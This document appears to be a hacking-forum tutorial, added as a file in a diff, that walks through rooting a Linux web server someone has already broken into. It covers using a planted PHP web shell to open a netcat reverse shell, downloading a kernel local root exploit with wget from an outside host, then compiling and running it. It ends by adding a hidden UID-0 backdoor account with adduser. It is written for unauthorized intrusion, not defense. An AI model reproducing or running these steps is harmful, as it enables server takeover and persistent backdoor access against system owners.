@@ -1,0 +1,150 @@
+Hi Freinds ! welcome to a tutorial on how to root a linux server.
+This is going to be short,HQ tutorial (For better learning)
+ 
+ 
+So let's start with things you will need:
+ 
+ 
+ 
+1) Shelled website
+2) Local root exploit
+3) NetCat
+ 
+ 
+ 
+Chapter 1 - Gathering informations
+ 
+ 
+Open up your .php shell on a hacked webserver.
+I have mine for an example
+ 
+ 
+Now you need to check what kernel your slave is using...
+It should be something like
+ 
+ 
+Linux somerandomhosting.com 2.6.18-8.el5 #1 SMP Fri Jan 26 14:15:21 EST 2007 i686
+ 
+ 
+Next thing you wanna do is to look for an local root exploit.
+From example provided mine one is 2.6.18-8.el5 #1 SMP Fri Jan 26 14:15:21 EST 2007 i686.
+ 
+ 
+Here's the list of exploits
+http://pastebin.com/A0sUhhrz
+ 
+NOTE: If your webserver have 2.6.18 2011 kernel,then you have 0.0001% chances that you will root it,because there's no public exploit for that version.
+ 
+ 
+Chapter 2 - Backconnecting to the server
+For this you will need:
+ 
+ 
+1) NetCat
+2) Open port (Example. 443 I won't teach how to port forward,use Google if you don't know how!!)
+ 
+ 
+So open your netcat and type:
+-l -n -v -p 443
+Hit "Enter"
+ 
+ 
+Now it should write "listening on [any] 443 ..."
+Good.
+Go back to your shell and go to "BackConnect function"
+Many shells have it.
+Enter your port and press "Connect".
+ 
+Now it should connect to your netcat
+I got something like this
+ 
+Chapter 3 - Downloading exploit and executing it
+Now we will need our exploit from Chapter 1
+There's 2 way of uploading:
+ 
+1) Using shell uploader
+2) Using 'wget' function (Requires backconnection)
+ 
+I'm going to use 'wget' function because it's easier and faster.
+So copy your exploit link (Mine one http://localroot.th3-0utl4ws.com/xploits...8-164.zip) and go back to your netcat and type:
+Now it downloaded out exploit named "2.6.18-164.zip" on our server.
+ 
+If your exploit is downloaded as anyrandomname.c you must compile it
+Do do that first download that exploit and then type:
+ 
+gcc anyrandomname.c -o anyrandomname
+And our exploit is compiled. (If you get errors when compiling then find another exploit)
+If you downloaded your exploit in zip file anyrandomname.zip type:
+ 
+unzip anyrandomname.zip
+ 
+Now you should have your exploit (Like mine "2.6.18-164")
+ 
+If you completed all steps it's time to get root.
+ 
+Type:
+ 
+chmod 777 yourexploit'sname
+With common sense where i typed "yourexploit'sname" you will type your exploit's name.
+ 
+And one last final step is to run our exploit
+./yourexploit'sname
+ 
+ 
+To check if you got root type
+ 
+id
+or
+whoami
+ 
+Mine steps to root
+ 
+Chapter 4 - Adding root user
+Adding new root user is fairly easy
+We use this command:
+adduser -u 0 -o -g 0 -G 0,1,2,3,4,6,10 -M root2
+ 
+Command explanations:
+Quote:adduser - Using Linux adduser command to create a new user account or to update default new user information.
+ 
+-u 0 -o - Set the value of user id to 0.
+ 
+-g 0 - Set the initial group number or name to 0
+ 
+-G 0,1,2,3,4,6,10 - Set supplementary group to:
+0 = root
+1 = bin
+2 = daemon
+3 = sys
+4 = adm
+6 = disk
+10 = wheel
+ 
+-M - 'home directory' not created for the user.
+ 
+root2 - User name of the new user account.NOTE: Change root2 to your desired username.
+ 
+Now you need to set a password for your username.
+Type in next:
+passwd Root2
+ 
+(Root2 is your username)
+ 
+See an example
+ 
+[root@fedora ~]# passwd root2
+Changing password for user root2.
+New UNIX password:
+Retype new UNIX password:
+passwd: all authentication tokens updated successfully.
+ 
+To check if you did alright
+ 
+id root2
+(Root2 is your username)
+GNY shell - http://privatepaste.com/1321f97984
+Google - http://google.com
+NetCat - http://downloadnetcat.com/nc11nt.zip
+ 
+So that concluded our rooting tutorial.
+I hope that someone will learn from this and that this thread will be bookmarked for generations
